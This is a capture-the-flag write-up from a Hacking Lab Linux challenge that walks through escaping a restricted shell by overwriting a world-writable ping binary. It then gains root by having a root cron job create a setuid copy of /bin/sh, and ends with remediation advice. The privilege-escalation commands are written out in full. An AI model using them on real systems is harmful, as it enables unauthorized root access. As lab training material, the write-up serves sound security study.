@@ -1,0 +1,133 @@
+7002 – Linux Security: Got Wurzel
+
+02/DEC/2015
+CTF: Hacking Lab
+Link to challenge: https://www.hacking-lab.com
+Date Completed: 02 December 2015
+I log into the system to discover I am in a restricted shell.
+Some testing reveals I can run commands like ls but cannot run cat etc.
+I realise that I can use the /  character in arguments but not in the command name.
+So I can’t call any commands by path.
+
+Thus I can only execute commands in the local ./bin directory.
+Lets see what is in the directory:
+
+
+$ ls ./bin
+ls ping tee
+1
+2
+$ ls ./bin
+ls ping tee
+Okay so I can run these three commands. They behave as expected.
+
+I look around the machine and notice a directory /home/restricted  which my user restricted1 also owns but this is simply a copy of the /home/restricted1  directory and thus a dead end.
+
+I then realise that /home/restricted1/ping  is world writeable.
+I can thus use tee and echo to write whatever I want to it.
+Initially I wrote shell code to the program but this is an issue as it would not spawn a shell in POSIX mode but rather console mode.
+
+Instead I use the flowing commands:
+
+
+echo -e '#!/bin/bash' | tee - ./bin/ping
+echo -e ' /bin/bash ' | tee -a ./bin/ping
+1
+2
+echo -e '#!/bin/bash' | tee - ./bin/ping
+echo -e ' /bin/bash ' | tee -a ./bin/ping
+Then I run the ping program and a (regular) shell is spawned.
+I am no longer in a restricted shell.
+
+I set my ENV path so I don’t have to specify full paths to programs:
+
+
+export PATH=$PATH:/bin
+export PATH=$PATH:/usr/bin
+1
+2
+export PATH=$PATH:/bin
+export PATH=$PATH:/usr/bin
+Now I need to escalate privileges from my regular shell.
+I try to find world writeable files.
+
+I run:
+
+
+find / -perm -0002 -type f -print
+1
+find / -perm -0002 -type f -print
+And keep the results in mind as I explore other things.
+
+I check many things, one of them being the /etc/  directory for cron jobs.
+I see that the  cron.minutely directory contains one program mtr that runs every minute but it is not world writeable.
+I still check the file using:
+
+
+cat /etc/cron.minutely/mtr
+1
+cat /etc/cron.minutely/mtr
+It turns out that /usr/bin/mtr-check  is called as part of this cronjob.
+
+I check my list from before to discover that this particular file happens to be world writeable!
+
+So we can write any program and it will be executed by root as a cronjob.
+
+We decide to write the following to the file (using echo and file redirection):
+
+
+cp /bin/sh /home/restricted1/rootbash && chmod 4755 /home/restricted1/rootbash
+1
+cp /bin/sh /home/restricted1/rootbash && chmod 4755 /home/restricted1/rootbash
+Essentially, we are copying /bin/sh  to our directory and setting the s flag using chmod 4755 (so we setuid upon execution). So when we run rootbash, it should give us a root shell.
+
+I go drink a cup of water (enough time for the minutely cronjob to run) and come back.
+I then see my rootbash program!
+
+I run it and a shell is spawned.
+
+
+$ whoami
+root
+1
+2
+$ whoami
+root
+Then I read the file at /root/secret.txt  to capture the flag.
+
+
+$ cat /root/secret.txt
+TEAM GOTWURZEL
+
+....etc
+1
+2
+3
+4
+$ cat /root/secret.txt
+TEAM GOTWURZEL
+ 
+....etc
+ 
+
+Security Questions:
+
+1. Explain the security problem
+The issue here is that I was able to break out of the restricted shell because the /home/restricted1/bin/ping  program was world writeable. If it was not, I wouldn’t be able to leave the restricted shell that way.
+
+Now assume I someone managed to break out of the restricted shell. The second issue is that a cronjob executed by root called a program that was world writeable.
+
+So the issues are simply permission issues.
+
+2. Explain your attack, How you were able to get the /root/secret.txt file
+Read above!
+In summary, I spawned a shell using the world writeable ping program.
+Then I spawned a root shell by executing a cronjob as root which put a copy of /bin/sh  in my directory with the s flag set. With the root shell, I read the secret file.
+
+3. Add some proofing information to your solution (traces, exploit code, gold nugget)
+All commands are above.
+
+4. What do you recommend for protection?
+Simply fix the permissions of the /home/restricted1/bin/ping  and /usr/bin/mtr-check  so they are not writeable!
+
+https://mohammadg.com/capture-the-flag/hacking-lab/7002-linux-security-got-wurzel/
